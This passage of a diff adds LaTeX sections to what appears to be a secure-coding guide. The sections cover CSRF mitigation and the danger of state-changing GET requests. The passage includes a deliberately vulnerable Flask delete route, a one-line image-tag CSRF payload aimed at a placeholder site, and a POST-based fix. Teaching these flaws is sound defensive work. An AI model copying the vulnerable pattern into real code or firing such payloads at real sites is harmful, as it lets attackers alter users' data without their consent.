+\textbf{Mitigation:} Include CSRF token in all forms that perform state changes; use framework template helpers (e.g., \texttt{\{\{ csrf\_token() \}\}} in Flask-WTF) that automatically include the token; validate CSRF tokens on the server for all form submissions.
+
+\subsection{GET Method State Changes}
+\label{sec:csrf_get_state}
+
+GET method state changes occur when applications use GET requests to perform state-changing operations (deletions, updates, purchases). This is vulnerable because GET requests can be triggered by links or images, making CSRF trivial.
+
+\textbf{How it works:} HTTP GET should be idempotent and only retrieve data. When GET performs state changes, attackers can embed links or images that trigger these operations. GET requests do not require forms, so CSRF protection is harder to apply.
+
+\textbf{Example -- Vulnerable Code:}
+
+\begin{lstlisting}[style=pycode]
+@app.route("/delete-item/<item_id>", methods=["GET"])
+def delete_item(item_id):
+    # State-changing operation via GET - vulnerable to CSRF
+    delete_item_from_db(item_id)
+    return redirect("/items")
+\end{lstlisting}
+
+\textbf{Attack Example:} Attacker triggers the state-changing GET request via an image or link. Example:
+\begin{lstlisting}[style=attackcode]
+<img src="http://victim-site.com/delete-item/123">
+\end{lstlisting}
+When an authenticated user visits the malicious page, the item is deleted without explicit consent.
+
+\textbf{Mitigation:} Never use GET for state-changing operations; use POST, PUT, or DELETE for modifications; follow RESTful principles; implement CSRF protection for all state-changing operations. Use POST for deletion:
+
+\begin{lstlisting}[style=pycode]
+@app.route("/delete-item/<item_id>", methods=["POST"])
+def delete_item(item_id):
+    # Use POST for state-changing operations
+    # CSRF protection is automatically applied by Flask-WTF
+    delete_item_from_db(item_id)
+    return redirect("/items")
+\end{lstlisting}
+
+
